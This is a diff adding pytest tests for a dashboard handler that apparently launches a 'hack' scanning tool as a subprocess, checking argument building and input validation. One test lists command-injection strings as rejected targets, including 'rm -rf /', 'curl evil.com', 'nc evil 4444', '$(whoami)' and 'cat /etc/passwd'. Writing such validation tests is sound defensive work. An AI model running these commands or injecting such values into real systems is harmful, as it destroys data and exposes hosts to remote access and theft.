@@ -26,6 +26,7 @@ from dashboard.server import (  # noqa: E402
     _hack_audit_query,
     _hack_hunt_snapshot,
     _hack_list_hunts,
+    _hack_start_subprocess,
 )
 
 
@@ -261,3 +262,133 @@ class TestAuditQuery:
         assert all(e["hunt_id"] == hid_a for e in result["events"])
         # And not empty
         assert result["count"] > 0
+
+
+# ---------------------------------------------------------------------------
+# _hack_start_subprocess — POST /api/hack/start handler
+# ---------------------------------------------------------------------------
+
+
+class TestStartSubprocess:
+    """These tests validate input WITHOUT actually spawning processes
+    (validation rejects the input before subprocess.Popen is called)."""
+
+    def test_empty_input_rejected(self):
+        result = _hack_start_subprocess({})
+        assert result["ok"] is False
+        assert "target" in result["error"]
+
+    def test_shell_metacharacter_target_rejected(self):
+        for bad in (
+            "example.com; rm -rf /",
+            "example.com && curl evil.com",
+            "example.com | nc evil 4444",
+            "example.com`whoami`",
+            "example.com\nrm -rf",
+            "example.com$(whoami)",
+            "example.com\"; cat /etc/passwd",
+        ):
+            r = _hack_start_subprocess({"target": bad})
+            assert r["ok"] is False, f"unsafe target accepted: {bad!r}"
+            assert "disallowed" in r["error"]
+
+    def test_legit_targets_accepted_into_argv(self, monkeypatch):
+        """Use a Popen mock so we capture the argv without spawning."""
+        captured: dict = {}
+
+        class _FakePopen:
+            def __init__(self, argv, **kw):
+                captured["argv"] = argv
+                self.pid = 4242
+
+        import subprocess
+        monkeypatch.setattr(subprocess, "Popen", _FakePopen)
+        result = _hack_start_subprocess({
+            "target": "http://127.0.0.1:9999",
+            "profile": "lab",
+            "go": True,
+            "time": 5,
+            "workers": 16,
+        })
+        assert result["ok"] is True
+        assert result["pid"] == 4242
+        # argv contains our flags
+        argv = captured["argv"]
+        assert "hack" in argv
+        assert "http://127.0.0.1:9999" in argv
+        assert "--profile" in argv and "lab" in argv
+        assert "--go" in argv
+        assert "--time" in argv and "5" in argv
+        assert "--workers" in argv and "16" in argv
+        assert "--quiet" in argv  # dashboard always passes --quiet
+
+    def test_resume_path(self, monkeypatch):
+        captured: dict = {}
+
+        class _FakePopen:
+            def __init__(self, argv, **kw):
+                captured["argv"] = argv
+                self.pid = 99
+
+        import subprocess
+        monkeypatch.setattr(subprocess, "Popen", _FakePopen)
+        r = _hack_start_subprocess({"resume": "http_127.0.0.1_9999_1778"})
+        assert r["ok"] is True
+        argv = captured["argv"]
+        assert "--resume" in argv
+        assert "http_127.0.0.1_9999_1778" in argv
+
+    def test_malformed_resume_rejected(self):
+        r = _hack_start_subprocess({"resume": "evil; rm -rf /"})
+        assert r["ok"] is False
+        assert "malformed" in r["error"]
+
+    def test_invalid_profile_silently_dropped(self, monkeypatch):
+        captured: dict = {}
+
+        class _FakePopen:
+            def __init__(self, argv, **kw):
+                captured["argv"] = argv
+                self.pid = 1
+
+        import subprocess
+        monkeypatch.setattr(subprocess, "Popen", _FakePopen)
+        r = _hack_start_subprocess({
+            "target": "example.com", "profile": "exotic",
+        })
+        # Invalid profile is dropped from argv (no error) — argparse
+        # would later reject it but the launcher is lenient
+        assert r["ok"] is True
+        assert "exotic" not in captured["argv"]
+        assert "--profile" not in captured["argv"]
+
+    def test_non_int_time_ignored(self, monkeypatch):
+        captured: dict = {}
+
+        class _FakePopen:
+            def __init__(self, argv, **kw):
+                captured["argv"] = argv
+                self.pid = 1
+
+        import subprocess
+        monkeypatch.setattr(subprocess, "Popen", _FakePopen)
+        r = _hack_start_subprocess({
+            "target": "example.com", "time": "five minutes",
+        })
+        assert r["ok"] is True
+        assert "--time" not in captured["argv"]
+
+    def test_command_preview_returned(self, monkeypatch):
+        class _FakePopen:
+            def __init__(self, argv, **kw):
+                self.pid = 1
+        import subprocess
+        monkeypatch.setattr(subprocess, "Popen", _FakePopen)
+        r = _hack_start_subprocess({"target": "example.com", "go": True})
+        assert "command_preview" in r
+        # Preview shows the flags so the operator can verify
+        assert "hack" in r["command_preview"]
+        assert "example.com" in r["command_preview"]
+        assert "--go" in r["command_preview"]
+        # And doesn't include the bare python interpreter path
+        assert "python" not in r["command_preview"].lower()
